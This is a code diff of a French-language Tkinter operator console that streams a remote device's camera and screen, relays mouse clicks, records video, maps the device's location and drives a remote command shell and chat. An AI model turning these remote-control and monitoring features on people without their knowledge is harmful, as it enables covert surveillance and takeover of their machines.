-        self.root.after(0, apply)
-
-    def _select_device(self, device_id: str) -> None:
-        if device_id == self.selected_device_id:
+    def _flush_display(self, panel: StreamPanel) -> None:
+        with panel.display_lock:
+            image = panel.pending_image
+            panel.pending_image = None
+            panel.display_scheduled = False
+        if image is None:
             return
-        # On change d'appareil : les enregistrements en cours appartiennent à
-        # l'ancien appareil, donc on les arrête proprement plutôt que de
-        # continuer à y écrire les images d'un autre appareil.
+        try:
+            self._render_frame(panel, image)
+        except (tk.TclError, RuntimeError):
+            pass
+
+    def _render_frame(self, panel: StreamPanel, image: np.ndarray) -> None:
+        """Redimensionne l'image à la taille disponible et l'affiche.
+        Pour l'écran, dessine aussi le curseur rouge à la position souris."""
+        target_w, target_h = panel.view_size
+        if target_w < 4 or target_h < 4:
+            return
+        img_h, img_w = image.shape[:2]
+        scale = min(target_w / img_w, target_h / img_h)
+        new_w, new_h = max(1, int(img_w * scale)), max(1, int(img_h * scale))
+
+        display = image
+        if panel.key == "screen" and self.mouse_position:
+            mouse = self.mouse_position
+            mx, my = mouse.get("x"), mouse.get("y")
+            sw, sh = mouse.get("screen_w"), mouse.get("screen_h")
+            if mx is not None and my is not None and sw and sh:
+                # Coordonnées écran -> coordonnées image source -> coordonnées affichées
+                rx = mx / sw * img_w
+                ry = my / sh * img_h
+                display = image.copy()
+                cx = int(rx)
+                cy = int(ry)
+                cv2.circle(display, (cx, cy), max(4, int(img_w * 0.006)),
+                           (59, 59, 255), 2, lineType=cv2.LINE_AA)
+
+        resized = cv2.resize(display, (new_w, new_h), interpolation=cv2.INTER_AREA)
+        rgb = cv2.cvtColor(resized, cv2.COLOR_BGR2RGB)
+        pil = Image.fromarray(rgb)
+        photo = ImageTk.PhotoImage(pil)
+        panel.video_label.configure(image=photo, text="")
+        panel.video_label.image = photo   # garde une référence
+
+    def _update_location_display(self, response) -> None:
+        """Met à jour le panneau de localisation à partir de /api/location/latest."""
+        try:
+            data = response.json()
+        except ValueError:
+            return
+        browser_open = bool(data.get("browser_open"))
+        latest = data.get("latest")
+        self.location_open = browser_open
+
+        if browser_open:
+            self.location_status_var.set("● Ouverte")
+            self.location_status_label.configure(fg=COLOR_OK)
+        else:
+            self.location_status_var.set("● Fermée")
+            self.location_status_label.configure(fg=COLOR_KO)
+
+        if latest and latest.get("lat") is not None:
+            lat = float(latest["lat"])
+            lon = float(latest["lon"])
+            acc = latest.get("accuracy")
+            acc_str = f"  (± {int(acc)} m)" if acc else ""
+            self.location_coords_var.set(f"{lat:.6f}, {lon:.6f}{acc_str}")
+            if _HAS_MAP and self.location_map is not None:
+                try:
+                    if self._location_marker is None:
+                        self._location_marker = self.location_map.set_marker(
+                            lat, lon, text="Position"
+                        )
+                        self.location_map.set_position(lat, lon)
+                        self.location_map.set_zoom(15)
+                    else:
+                        self._location_marker.set_position(lat, lon)
+                        self.location_map.set_position(lat, lon)
+                except Exception:
+                    pass
+        else:
+            self.location_coords_var.set("Aucune position reçue pour le moment.")
+
+    def _update_status(self, connected: bool) -> None:
+        if connected:
+            self.status_var.set("● Connecté")
+            self.status_label.configure(fg=COLOR_OK)
+        else:
+            self.status_var.set("● Déconnecté")
+            self.status_label.configure(fg=COLOR_KO)
+
+    def _sync_buttons(self, connected: bool) -> None:
+        """Active/désactive les boutons selon l'état du client sélectionné."""
+        state = "normal" if connected else "disabled"
         for key, panel in self.panels.items():
-            if panel.recording:
-                self._stop_recording(key)
-                self._log(f"Enregistrement « {panel.title} » arrêté (changement d'appareil)")
+            if panel.on:
+                if panel.btn_start is not None:
+                    panel.btn_start["state"] = "disabled"
+                if panel.btn_stop is not None:
+                    panel.btn_stop["state"] = state
+                panel.status_var.set("● En marche")
+                panel.status_label.configure(fg=COLOR_OK)
+            else:
+                if panel.btn_start is not None:
+                    panel.btn_start["state"] = state
+                if panel.btn_stop is not None:
+                    panel.btn_stop["state"] = "disabled"
+                panel.status_var.set("● Arrêté")
+                panel.status_label.configure(fg=COLOR_KO)
+        loc_state = state
+        if self.btn_location_open is not None:
+            self.btn_location_open["state"] = loc_state
+        if self.btn_location_close is not None:
+            self.btn_location_close["state"] = loc_state
+        for btn in (self.btn_open_cmd, self.btn_open_chat):
+            if btn is not None:
+                btn["state"] = state
 
-        self.selected_device_id = device_id
-        device = self.devices.get(device_id, {})
-        label = f"{device.get('name', '?')} — ({device_id[:8]})"
-        self.device_var.set(label)
-        for panel in self.panels.values():
-            self._show_placeholder(panel)
+    def _sync_device_list(self, devices: dict) -> None:
+        """Met à jour la liste déroulante des appareils sans perdre la sélection."""
+        if devices == self.devices:
+            return
+        self.devices = devices
+        labels = []
+        ids = []
+        for device_id, device in devices.items():
+            status = "●" if device.get("connected") else "○"
+            label = f"{status}  {device.get('name', device_id[:8])}  ({device_id[:8]})"
+            labels.append(label)
+            ids.append(device_id)
+        try:
+            self.device_combo["values"] = labels
+        except tk.TclError:
+            return
 
-        # La position affichée appartient à l'ANCIEN appareil : on l'efface
-        # en attendant le prochain polling (/api/location/latest) du nouveau.
-        self.last_location = None
-        self.location_coords_var.set("Chargement de la position...")
-        self.location_status_var.set("● Statut inconnu")
-        self.location_status_label.configure(foreground=COLOR_MUTED)
-        # Idem pour la souris : l'ancienne position ne doit pas être dessinée
-        # sur les images du nouvel appareil.
-        self.mouse_position = None
+        if self.selected_device_id in ids:
+            index = ids.index(self.selected_device_id)
+            self.device_combo.current(index)
+        elif ids:
+            self.device_combo.current(0)
+            self.selected_device_id = ids[0]
+            self._log(f"Appareil sélectionné : {devices[ids[0]].get('name', ids[0])}")
+        else:
+            self.device_var.set("")
+            self.selected_device_id = None
 
-        self._log(f"Appareil sélectionné : {label}")
-
-    def _on_device_selected(self, _event) -> None:
+    def _on_device_selected(self, _event=None) -> None:
         index = self.device_combo.current()
+        if index < 0:
+            return
         device_ids = list(self.devices.keys())
-        if 0 <= index < len(device_ids):
-            self._select_device(device_ids[index])
+        if index >= len(device_ids):
+            return
+        self.selected_device_id = device_ids[index]
+        device = self.devices.get(self.selected_device_id)
+        if device:
+            self._log(f"Appareil sélectionné : {device.get('name', self.selected_device_id)}")
 
-    # ------------------------------------------------------------------
-    # Commandes envoyées au serveur (pour l'appareil sélectionné)
-    # ------------------------------------------------------------------
     def _send_command(self, stream: str, command: str) -> None:
         if self.selected_device_id is None:
             self._log("Aucun appareil sélectionné")
@@ -1078,324 +1109,443 @@ class CameraServerApp:
                 json={"device_id": self.selected_device_id, "stream": stream, "command": command},
                 timeout=REQUEST_TIMEOUT,
             )
-            self._log(f"Commande envoyée : {stream} → {command}")
+            self._log(f"Commande {command} envoyée pour {stream}")
         except requests.RequestException as exc:
-            self._log(f"Échec de l'envoi de la commande : {exc}")
-
-    # ------------------------------------------------------------------
-    # Téléchargement de l'installateur Windows du client
-    # ------------------------------------------------------------------
-    def download_client_installer(self) -> None:
-        path = filedialog.asksaveasfilename(
-            title="Enregistrer l'installateur du client",
-            defaultextension=".exe",
-            initialfile="CameraClient-Setup.exe",
-            filetypes=[("Exécutable Windows", "*.exe"), ("Tous les fichiers", "*.*")],
-        )
-        if not path:
-            return
-        self._log(f"Téléchargement du client depuis {self.server_url}/download/windows ...")
-        threading.Thread(target=self._do_download_client, args=(path,), daemon=True).start()
-
-    def _do_download_client(self, path: str) -> None:
-        try:
-            response = requests.get(f"{self.server_url}/download/windows", timeout=DOWNLOAD_TIMEOUT)
-            if response.status_code == 404:
-                self._log("L'installateur Windows du client n'est pas encore publié sur le serveur")
-                return
-            response.raise_for_status()
-            with open(path, "wb") as f:
-                f.write(response.content)
-            self._log(f"Client téléchargé : {path}")
-        except requests.RequestException as exc:
-            self._log(f"Échec du téléchargement du client : {exc}")
-        except OSError as exc:
-            self._log(f"Impossible d'écrire le fichier : {exc}")
-
-    # ------------------------------------------------------------------
-    # Enregistrement vidéo — indépendant pour chaque flux
-    # ------------------------------------------------------------------
-    def toggle_recording(self, stream_key: str) -> None:
-        panel = self.panels[stream_key]
-        if panel.recording:
-            self._stop_recording(stream_key)
-        else:
-            self._start_recording(stream_key)
-
-    def _start_recording(self, stream_key: str) -> None:
-        panel = self.panels[stream_key]
-        if self.selected_device_id is None:
-            self._log("Aucun appareil sélectionné : impossible d'enregistrer")
-            return
-
-        if not panel.on:
-            self._log(
-                f"⚠ Le flux « {panel.title} » n'est pas démarré sur cet appareil : "
-                "cliquez d'abord sur son bouton « Démarrer », sinon l'enregistrement restera vide "
-                "tant qu'aucune image n'arrive."
-            )
-
-        default_name = f"{stream_key}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.mp4"
-        path = filedialog.asksaveasfilename(
-            title=f"Enregistrer la vidéo — {panel.title}",
-            defaultextension=".mp4",
-            initialfile=default_name,
-            filetypes=[("Vidéo MP4", "*.mp4"), ("Vidéo AVI", "*.avi"), ("Tous les fichiers", "*.*")],
-        )
-        if not path:
-            return
-        fps = RECORD_FPS_SCREEN if stream_key == "screen" else RECORD_FPS_CAMERA
-        panel.last_jpeg = None
-        panel.recorder = VideoRecorder(
-            path, fps, log=self._log, on_fatal=lambda k=stream_key: self.root.after(0, self._stop_recording, k)
-        )
-        panel.recorder.start()
-        panel.recording = True
-        self._throttle_times.pop(f"waiting_frames_{stream_key}", None)  # on veut revoir l'avertissement si ça persiste
-        panel.btn_record.configure(text="⏹  Arrêter l'enreg.", style="RecordOn.TButton")
-        panel.rec_badge.pack(side="left", padx=(10, 0))
-        self._log(f"Enregistrement démarré ({panel.title}) : {path}")
-
-    def _stop_recording(self, stream_key: str) -> None:
-        panel = self.panels[stream_key]
-        recorder = panel.recorder
-        panel.recording = False
-        panel.recorder = None
-        panel.btn_record.configure(text="⏺  Enregistrer", style="Record.TButton")
-        panel.rec_badge.pack_forget()
-        if recorder is None:
-            return
-
-        report = recorder.stop()
-        if recorder.failed:
-            return  # le message d'erreur a déjà été journalisé
-        if report.frames_written == 0:
-            self._log(
-                f"⚠ Aucune image n'a été écrite dans {report.path} — le flux « {panel.title} » n'a jamais "
-                "envoyé d'image pendant l'enregistrement (voir les messages « En attente d'images... » : "
-                "le flux n'était probablement pas démarré sur l'appareil, ou celui-ci s'est déconnecté)."
-            )
-            return
-        if not report.verified_ok:
-            self._log(
-                f"❌ Le fichier {report.path} a été créé mais n'est pas lisible "
-                f"({report.frames_written} images écrites). Réessayez en .avi."
-            )
-            return
-        self._log(
-            f"Enregistrement terminé ({panel.title}) : {report.path} — {report.duration:.0f} s, "
-            f"{report.frames_written} images écrites ({report.frames_received} images distinctes reçues)"
-        )
-        if report.max_std < BLACK_FRAME_STD:
-            self._log(
-                f"⚠ Toutes les images reçues sur « {panel.title} » sont noires/uniformes : la vidéo est "
-                "valide mais NOIRE. Voir le journal du client (~/.local/share/camera-client/client.log)."
-            )
-
-    def _write_recording_frame(self, panel: StreamPanel, jpeg_bytes: bytes) -> None:
-        recorder = panel.recorder
-        if recorder is None:
-            return
-        if jpeg_bytes == panel.last_jpeg:
-            return   # même image que le tour précédent : le recorder la répète déjà tout seul
-        panel.last_jpeg = jpeg_bytes
-        array = np.frombuffer(jpeg_bytes, dtype=np.uint8)
-        image = cv2.imdecode(array, cv2.IMREAD_COLOR)
-        if image is None:
-            self._log_throttled(f"decode_failed_{panel.key}", f"Image reçue invalide sur « {panel.title} » : ignorée")
-            return
-        recorder.push(image)
-
-    # ------------------------------------------------------------------
-    # Mise à jour de l'interface (toujours via root.after, thread principal)
-    # ------------------------------------------------------------------
-    def _handle_frame(self, panel: StreamPanel, jpeg_bytes: bytes) -> None:
-        # L'affichage d'abord : le décodage pour l'enregistrement ne doit pas le retarder.
-        self._display_frame(panel, jpeg_bytes)
-        if panel.recording:
-            self._write_recording_frame(panel, jpeg_bytes)
-
-    def _update_status(self, connected: bool) -> None:
-        def apply():
-            if connected:
-                self.status_var.set("● Client connecté")
-                self.status_label.configure(foreground=COLOR_OK)
-                self._log("Client connecté")
-            else:
-                self.status_var.set("● Client déconnecté")
-                self.status_label.configure(foreground=COLOR_KO)
-                self._log("Client déconnecté")
-        self.root.after(0, apply)
-
-    def _sync_buttons(self, connected: bool) -> None:
-        def apply():
-            for key, panel in self.panels.items():
-                active = getattr(self, f"{key}_on")
-                panel.btn_start["state"] = "normal" if connected and not active else "disabled"
-                panel.btn_stop["state"] = "normal" if connected and active else "disabled"
-                panel.status_var.set("● Actif" if connected and active else "● Arrêté")
-                panel.status_label.configure(foreground=COLOR_OK if connected and active else COLOR_KO)
-            self.btn_location_open["state"] = "normal" if connected and not self.location_open else "disabled"
-            self.btn_location_close["state"] = "normal" if connected and self.location_open else "disabled"
-        self.root.after(0, apply)
-
-    def _update_location_display(self, data: dict) -> None:
-        """Met à jour le statut, les coordonnées en texte et le marqueur sur
-        la carte à partir de la réponse de /api/location/latest."""
-        def apply():
-            self.location_open = bool(data.get("browser_open"))
-            self.location_status_var.set("● Ouverte" if self.location_open else "● Fermée")
-            self.location_status_label.configure(
-                foreground=COLOR_OK if self.location_open else COLOR_KO
-            )
-
-            latest = data.get("latest")
-            if latest:
-                self.last_location = latest
-                lat, lon = latest["lat"], latest["lon"]
-                accuracy = latest.get("accuracy")
-                ts = latest.get("ts")
-                when = datetime.fromtimestamp(ts / 1000).strftime("%H:%M:%S") if ts else "?"
-                acc_text = f"± {accuracy:.0f} m" if isinstance(accuracy, (int, float)) else "précision inconnue"
-                self.location_coords_var.set(
-                    f"{lat:.6f}, {lon:.6f}\n{acc_text}  ·  reçue à {when}"
-                )
-                if self.location_map is not None:
-                    if self._location_marker is None:
-                        self._location_marker = self.location_map.set_marker(lat, lon, text="Appareil")
-                        self.location_map.set_zoom(16)
-                    else:
-                        self._location_marker.set_position(lat, lon)
-                    self.location_map.set_position(lat, lon)
-        self.root.after(0, apply)
-
-    def _display_frame(self, panel: StreamPanel, jpeg_bytes: bytes) -> None:
-        """Décode et redimensionne DANS LE THREAD DE RÉCEPTION (le thread Tk ne
-        fait plus que l'affichage). Une seule image en attente par panneau :
-        si l'interface est en retard, l'image périmée est simplement remplacée
-        au lieu de s'empiler dans la file de Tk (cause de latence croissante)."""
-        max_w, max_h = panel.view_size
-        image = Image.open(io.BytesIO(jpeg_bytes))
-        image.thumbnail((max_w, max_h), Image.BILINEAR)   # utilise aussi le décodage JPEG réduit
-        image.load()
-
-        # Panneau écran : on dessine le curseur de la souris distante AVANT
-        # la mise en attente, en coordonnées de l'image réduite.
-        if panel.key == "screen":
-            image = self._draw_remote_cursor(image)
-
-        with panel.display_lock:
-            panel.pending_image = image
-            already_scheduled = panel.display_scheduled
-            panel.display_scheduled = True
-        if not already_scheduled:
-            self.root.after(0, self._apply_pending_image, panel)
-
-    def _draw_remote_cursor(self, image: Image.Image) -> Image.Image:
-        """Superpose un petit curseur rouge à la position de la souris
-        distante. La position est en coordonnées écran source ; l'image est
-        déjà réduite : on met à l'échelle."""
-        mouse = self.mouse_position
-        if not mouse or mouse.get("x") is None or not mouse.get("screen_w"):
-            return image
-        src_w, src_h = mouse["screen_w"], mouse["screen_h"]
-        if not src_w or not src_h:
-            return image
-        cx = mouse["x"] * image.width / src_w
-        cy = mouse["y"] * image.height / src_h
-        if not (0 <= cx < image.width and 0 <= cy < image.height):
-            return image
-        overlay = image.copy()
-        draw = ImageDraw.Draw(overlay)
-        r = MOUSE_CURSOR_RADIUS
-        draw.ellipse((cx - r, cy - r, cx + r, cy + r),
-                     fill=MOUSE_CURSOR_COLOR, outline="white", width=1)
-        return overlay
-
-    def _apply_pending_image(self, panel: StreamPanel) -> None:
-        with panel.display_lock:
-            image = panel.pending_image
-            panel.pending_image = None
-            panel.display_scheduled = False
-        if image is None:
-            return
-        photo = ImageTk.PhotoImage(image)
-        panel.video_label.configure(image=photo, text="")
-        panel.video_label.image = photo  # garder une référence
+            self._log(f"Échec de l'envoi de la commande {command} : {exc}")
 
     def _on_screen_click(self, panel: StreamPanel, event) -> None:
-        """Convertit un clic sur l'image réduite en coordonnées écran réelles
-        et envoie la commande au serveur. On se base sur la taille de l'écran
-        SOURCE rapportée par le client (screen_w/screen_h) : c'est la seule
-        conversion correcte, car l'image affichée est elle-même redimensionnée."""
+        """Convertit un clic sur l'image écran en coordonnées écran réelles."""
         if self.selected_device_id is None:
             return
-        mouse = self.mouse_position
-        if not mouse or not mouse.get("screen_w") or not mouse.get("screen_h"):
-            self._log_throttled(
-                "click_no_size",
-                "Clic ignoré : taille d'écran du client inconnue (le flux écran est-il démarré ?)",
-            )
+        if panel.video_label is None or panel.video_label.image is None:
             return
-        widget = panel.video_label
-        photo = getattr(widget, "image", None)
-        if photo is None:
+        # Taille affichée de l'image (via view_size et ratio réel)
+        target_w, target_h = panel.view_size
+        if target_w < 4 or target_h < 4:
             return
-        img_w, img_h = photo.width(), photo.height()
-        if img_w <= 0 or img_h <= 0:
+        # On se base sur la dernière image connue pour connaître le ratio
+        jpeg = panel.last_jpeg
+        if jpeg is None:
             return
-        # Le Label peut être plus grand que l'image (pack fill/expand) : on
-        # centre l'image dans le Label pour trouver son origine.
-        off_x = max((widget.winfo_width() - img_w) // 2, 0)
-        off_y = max((widget.winfo_height() - img_h) // 2, 0)
-        px, py = event.x - off_x, event.y - off_y
-        if not (0 <= px < img_w and 0 <= py < img_h):
-            return   # clic dans la marge du Label, hors image
-        real_x = int(px * mouse["screen_w"] / img_w)
-        real_y = int(py * mouse["screen_h"] / img_h)
+        arr = np.frombuffer(jpeg, dtype=np.uint8)
+        img = cv2.imdecode(arr, cv2.IMREAD_COLOR)
+        if img is None:
+            return
+        img_h, img_w = img.shape[:2]
+        scale = min(target_w / img_w, target_h / img_h)
+        new_w, new_h = max(1, int(img_w * scale)), max(1, int(img_h * scale))
+        # Offset de centrage dans le label
+        offset_x = (target_w - new_w) // 2
+        offset_y = (target_h - new_h) // 2
+        x_in_img = (event.x - offset_x) / max(scale, 1e-6)
+        y_in_img = (event.y - offset_y) / max(scale, 1e-6)
+        if x_in_img < 0 or y_in_img < 0 or x_in_img >= img_w or y_in_img >= img_h:
+            return
+        # Coordonnées écran réelles via screen_w/h rapportés par le client
+        mouse = self.mouse_position or {}
+        sw, sh = mouse.get("screen_w"), mouse.get("screen_h")
+        if not sw or not sh:
+            # À défaut, on suppose que l'image EST l'écran (pas de réduction)
+            sw, sh = img_w, img_h
+        real_x = int(x_in_img / img_w * sw)
+        real_y = int(y_in_img / img_h * sh)
         try:
             requests.post(
                 f"{self.server_url}/api/mouse/click",
                 json={"device_id": self.selected_device_id, "x": real_x, "y": real_y},
                 timeout=REQUEST_TIMEOUT,
             )
-            self._log(f"Clic envoyé : ({real_x}, {real_y})")
+            self._log(f"Clic distant envoyé : ({real_x}, {real_y})")
         except requests.RequestException as exc:
-            self._log(f"Échec de l'envoi du clic : {exc}")
+            self._log(f"Échec envoi du clic : {exc}")
+
+    # ------------------------------------------------------------------
+    # Enregistrement vidéo
+    # ------------------------------------------------------------------
+    def toggle_recording(self, key: str) -> None:
+        panel = self.panels[key]
+        if panel.recording:
+            self._stop_recording(key)
+        else:
+            self._start_recording(key)
+
+    def _start_recording(self, key: str) -> None:
+        panel = self.panels[key]
+        if panel.last_jpeg is None:
+            self._log("Impossible d'enregistrer : aucune image reçue pour le moment.")
+            return
+        fps = RECORD_FPS_CAMERA if key == "camera" else RECORD_FPS_SCREEN
+        default_name = f"{key}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.mp4"
+        path = filedialog.asksaveasfilename(
+            title=f"Enregistrer le flux {key}",
+            defaultextension=".mp4",
+            initialfile=default_name,
+            filetypes=[("Vidéo MP4", "*.mp4"), ("Vidéo AVI", "*.avi")],
+        )
+        if not path:
+            return
+
+        recorder = VideoRecorder(
+            path, fps, log=self._log, on_fatal=lambda: self._stop_recording(key)
+        )
+        recorder.start()
+        panel.recorder = recorder
+        panel.recording = True
+        panel.btn_record.configure(text="⏹  Arrêter l'enregistrement", style="RecordOn.TButton")
+        panel.rec_badge.pack(side="right", padx=(0, 8))
+        self._log(f"Enregistrement {key} démarré : {path}")
+
+    def _stop_recording(self, key: str) -> None:
+        panel = self.panels[key]
+        recorder = panel.recorder
+        if recorder is None:
+            return
+        panel.recording = False
+        panel.recorder = None
+        panel.btn_record.configure(text="⏺  Enregistrer", style="Record.TButton")
+        try:
+            panel.rec_badge.pack_forget()
+        except tk.TclError:
+            pass
+        report = recorder.stop()
+        if report.frames_written == 0:
+            self._log(f"❌ Enregistrement {key} vide (aucune image écrite).")
+        elif not report.verified_ok:
+            self._log(
+                f"⚠ Enregistrement {key} terminé mais fichier non relisible : {report.path}"
+            )
+        else:
+            self._log(
+                f"✅ Enregistrement {key} terminé : {report.path} "
+                f"({report.frames_written} images, codec {report.codec})"
+            )
+        if report.max_std < BLACK_FRAME_STD:
+            self._log(
+                f"⚠ La vidéo {key} semble noire (écart-type max {report.max_std:.2f})."
+            )
+
+    # ------------------------------------------------------------------
+    # Journal
+    # ------------------------------------------------------------------
+    def _log(self, message: str) -> None:
+        """Ajoute une ligne au journal (thread-safe via queue)."""
+        self.log_queue.put((datetime.now().strftime("%H:%M:%S"), message))
 
     def _poll_logs(self) -> None:
-        while not self.log_queue.empty():
-            message = self.log_queue.get_nowait()
-            stamp, body = message[:10], message[11:]   # "[HH:MM:SS]" puis le texte
-            lowered = body.lower()
-            if "❌" in body or "échec" in lowered or "erreur" in lowered or "injoignable" in lowered or "impossible" in lowered:
-                tag = "err"
-            elif "⚠" in body or "déconnecté" in lowered or "arrêté" in lowered or "⏳" in body:
-                tag = "warn"
-            elif "connecté" in lowered or "terminé" in lowered or "téléchargé" in lowered or "démarré" in lowered:
-                tag = "ok"
-            else:
-                tag = ""
-            self.log_text["state"] = "normal"
-            self.log_text.insert("end", stamp + "  ", "time")
-            self.log_text.insert("end", body + "\n", tag)
-            self.log_text.see("end")
-            self.log_text["state"] = "disabled"
+        try:
+            while True:
+                ts, message = self.log_queue.get_nowait()
+                self.log_text["state"] = "normal"
+                self.log_text.insert("end", f"[{ts}] ", "time")
+                tag = "err" if ("❌" in message or "erreur" in message.lower()) else (
+                    "warn" if ("⚠" in message or "échec" in message.lower()) else (
+                        "ok" if "✅" in message else ""
+                    )
+                )
+                if tag:
+                    self.log_text.insert("end", message + "\n", tag)
+                else:
+                    self.log_text.insert("end", message + "\n")
+                self.log_text.see("end")
+                self.log_text["state"] = "disabled"
+        except queue.Empty:
+            pass
         self.root.after(200, self._poll_logs)
 
-    def _log(self, message: str) -> None:
-        timestamp = datetime.now().strftime("%H:%M:%S")
-        self.log_queue.put(f"[{timestamp}] {message}")
+    # ------------------------------------------------------------------
+    # Téléchargement du client
+    # ------------------------------------------------------------------
+    def download_client_installer(self) -> None:
+        try:
+            url = f"{self.server_url}/download/windows"
+            response = requests.get(url, timeout=DOWNLOAD_TIMEOUT, allow_redirects=True)
+            response.raise_for_status()
+            path = filedialog.asksaveasfilename(
+                title="Enregistrer l'installateur du client",
+                defaultextension=".exe",
+                initialfile="CameraClient-Setup.exe",
+                filetypes=[("Installateur Windows", "*.exe"), ("Tous les fichiers", "*.*")],
+            )
+            if not path:
+                return
+            Path(path).write_bytes(response.content)
+            self._log(f"Installateur téléchargé : {path}")
+        except requests.RequestException as exc:
+            self._log(f"Échec du téléchargement de l'installateur : {exc}")
 
+    # ------------------------------------------------------------------
+    # CMD Commandes (fenêtre GUI par appareil)
+    # ------------------------------------------------------------------
+    def _open_cmd_window_for_selected(self) -> None:
+        if self.selected_device_id is None:
+            self._log("Aucun appareil sélectionné")
+            return
+        self._open_cmd_window(self.selected_device_id)
+
+    def _open_cmd_window(self, device_id: str) -> None:
+        existing = self._cmd_windows.get(device_id)
+        if existing is not None and existing.winfo_exists():
+            existing.lift()
+            existing.focus_force()
+            return
+
+        win = tk.Toplevel(self.root)
+        win.title(f"CMD distant — {device_id[:8]}")
+        win.geometry("820x520")
+        win.configure(bg=COLOR_BG)
+        self._cmd_windows[device_id] = win
+
+        top = tk.Frame(win, bg=COLOR_BG)
+        top.pack(fill="x", padx=10, pady=(10, 0))
+        state_var = tk.StringVar(value="Console distante : ● fermée")
+        tk.Label(top, textvariable=state_var, bg=COLOR_BG, fg=COLOR_MUTED,
+                 font=(FONT, 9, "bold")).pack(side="left")
+
+        def open_remote():
+            try:
+                requests.post(
+                    f"{self.server_url}/api/shell/console",
+                    json={"device_id": device_id, "command": "OPEN"},
+                    timeout=REQUEST_TIMEOUT,
+                )
+                self._log(f"[{device_id[:8]}] Console distante : ouverture demandée")
+            except requests.RequestException as exc:
+                self._log(f"Échec : {exc}")
+
+        def close_remote():
+            try:
+                requests.post(
+                    f"{self.server_url}/api/shell/console",
+                    json={"device_id": device_id, "command": "CLOSE"},
+                    timeout=REQUEST_TIMEOUT,
+                )
+                self._log(f"[{device_id[:8]}] Console distante : fermeture demandée")
+            except requests.RequestException as exc:
+                self._log(f"Échec : {exc}")
+
+        ttk.Button(top, text="▶ Ouvrir chez le client", style="Start.TButton",
+                   command=open_remote).pack(side="right", padx=(6, 0))
+        ttk.Button(top, text="■ Fermer chez le client", style="Stop.TButton",
+                   command=close_remote).pack(side="right")
+
+        output = tk.Text(
+            win, bg=COLOR_VIDEO_BG, fg="#d0d7ee", font=(FONT_MONO, 10),
+            insertbackground=COLOR_TEXT, relief="flat", wrap="char", state="disabled",
+        )
+        output.pack(fill="both", expand=True, padx=10, pady=(8, 6))
+
+        entry_frame = tk.Frame(win, bg=COLOR_BG)
+        entry_frame.pack(fill="x", padx=10, pady=(0, 10))
+        prompt_var = tk.StringVar(value="C:\\>")
+        tk.Label(entry_frame, textvariable=prompt_var, bg=COLOR_BG, fg=COLOR_CAMERA,
+                 font=(FONT_MONO, 10, "bold")).pack(side="left")
+        cmd_var = tk.StringVar()
+        entry = ttk.Entry(entry_frame, textvariable=cmd_var, font=(FONT_MONO, 10))
+        entry.pack(side="left", fill="x", expand=True, ipady=4, padx=(6, 0))
+        entry.focus_set()
+
+        def send_command(event=None):
+            cmd = cmd_var.get()
+            if not cmd.strip():
+                return
+            cmd_var.set("")
+            try:
+                requests.post(
+                    f"{self.server_url}/api/shell/input",
+                    json={"device_id": device_id, "text": cmd},
+                    timeout=REQUEST_TIMEOUT,
+                )
+            except requests.RequestException as exc:
+                self._log(f"Erreur envoi commande : {exc}")
+
+        entry.bind("<Return>", send_command)
+
+        last_seq = {"value": -1}
+
+        def refresh():
+            if not win.winfo_exists():
+                self._cmd_windows.pop(device_id, None)
+                return
+            try:
+                resp = requests.get(
+                    f"{self.server_url}/api/shell/output/latest",
+                    params={"device_id": device_id, "after": last_seq["value"], "wait": 1.0},
+                    timeout=3,
+                )
+                if resp.status_code == 200:
+                    data = resp.json()
+                    if data["seq"] != last_seq["value"]:
+                        last_seq["value"] = data["seq"]
+                        output["state"] = "normal"
+                        output.delete("1.0", "end")
+                        output.insert("end", data["buffer"])
+                        output.see("end")
+                        output["state"] = "disabled"
+                    state_var.set(
+                        "Console distante : " + ("● ouverte" if data["console_open"] else "● fermée")
+                    )
+            except requests.RequestException:
+                pass
+            win.after(SHELL_OUTPUT_POLL_INTERVAL_MS, refresh)
+
+        refresh()
+        output["state"] = "normal"
+        output.insert("end", "Cliquez sur « Ouvrir chez le client » pour démarrer la console.\n")
+        output["state"] = "disabled"
+        # Fermer la fenêtre GUI NE ferme PAS la console distante.
+        win.protocol("WM_DELETE_WINDOW", lambda: self._close_cmd_window(device_id, win))
+
+    def _close_cmd_window(self, device_id: str, win: tk.Toplevel) -> None:
+        try:
+            win.destroy()
+        except Exception:
+            pass
+        self._cmd_windows.pop(device_id, None)
+
+    # ------------------------------------------------------------------
+    # Chat (fenêtre GUI par appareil)
+    # ------------------------------------------------------------------
+    def _open_chat_window_for_selected(self) -> None:
+        if self.selected_device_id is None:
+            self._log("Aucun appareil sélectionné")
+            return
+        self._open_chat_window(self.selected_device_id)
+
+    def _open_chat_window(self, device_id: str) -> None:
+        existing = self._chat_windows.get(device_id)
+        if existing is not None and existing.winfo_exists():
+            existing.lift()
+            existing.focus_force()
+            return
+
+        win = tk.Toplevel(self.root)
+        win.title(f"Chat — {device_id[:8]}")
+        win.geometry("500x560")
+        win.configure(bg=COLOR_BG)
+        self._chat_windows[device_id] = win
+
+        top = tk.Frame(win, bg=COLOR_BG)
+        top.pack(fill="x", padx=10, pady=(10, 0))
+        remote_state_var = tk.StringVar(value="Console distante : ● fermée")
+        tk.Label(top, textvariable=remote_state_var, bg=COLOR_BG, fg=COLOR_MUTED,
+                 font=(FONT, 9, "bold")).pack(side="left")
+
+        def open_remote():
+            try:
+                requests.post(
+                    f"{self.server_url}/api/shell/chat_window",
+                    json={"device_id": device_id, "command": "OPEN"},
+                    timeout=REQUEST_TIMEOUT,
+                )
+                self._log(f"[{device_id[:8]}] Chat : ouverture demandée")
+            except requests.RequestException as exc:
+                self._log(f"Échec : {exc}")
+
+        def close_remote():
+            try:
+                requests.post(
+                    f"{self.server_url}/api/shell/chat_window",
+                    json={"device_id": device_id, "command": "CLOSE"},
+                    timeout=REQUEST_TIMEOUT,
+                )
+                self._log(f"[{device_id[:8]}] Chat : fermeture demandée")
+            except requests.RequestException as exc:
+                self._log(f"Échec : {exc}")
+
+        ttk.Button(top, text="🌐 Ouvrir chez le client", style="Start.TButton",
+                   command=open_remote).pack(side="right", padx=(6, 0))
+        ttk.Button(top, text="✖ Fermer chez le client", style="Stop.TButton",
+                   command=close_remote).pack(side="right")
+
+        history = tk.Text(
+            win, bg=COLOR_VIDEO_BG, fg=COLOR_TEXT, font=(FONT, 10),
+            relief="flat", wrap="word", state="disabled",
+        )
+        history.pack(fill="both", expand=True, padx=10, pady=(8, 6))
+        history.tag_configure("moi", foreground=COLOR_CAMERA)
+        history.tag_configure("client", foreground=COLOR_SCREEN)
+
